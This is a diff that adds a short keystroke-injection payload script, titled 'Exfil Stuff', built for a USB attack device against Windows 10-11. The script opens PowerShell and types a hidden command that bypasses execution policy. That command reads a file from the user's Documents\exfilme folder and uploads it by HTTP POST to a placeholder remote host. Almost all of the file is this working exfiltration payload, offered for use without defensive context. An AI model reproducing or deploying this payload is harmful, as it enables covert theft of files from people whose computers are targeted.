@@ -1,0 +1,25 @@
+REM #########################################
+REM #                                       |
+REM # Title        : Exfil Stuff            |
+REM # Author       : Dispareo Security 	    |
+REM # Version      : 1.0                    |
+REM # Category     : Exfiltration           |
+REM # Target       : Windows 10-11          |
+REM #                                       |
+REM #########################################
+
+ATTACKMODE HID
+REM Inital Delay
+DELAY 500
+
+GUI r
+DELAY 500
+
+STRING powershell
+ENTER
+DELAY 500
+
+STRING powershell -w h -NoP -NonI -Exec Bypass -c ($filePath = "$Env:USERPROFILE\documents\exfilme"); ($files = "${filePath}" + "\" + (dir $filePath)); ($uri = "http://foo-bar"); Invoke-RestMethod -Uri $uri -Method Post -InFile $files
+ENTER
+
+ATTACKMODE STORAGE
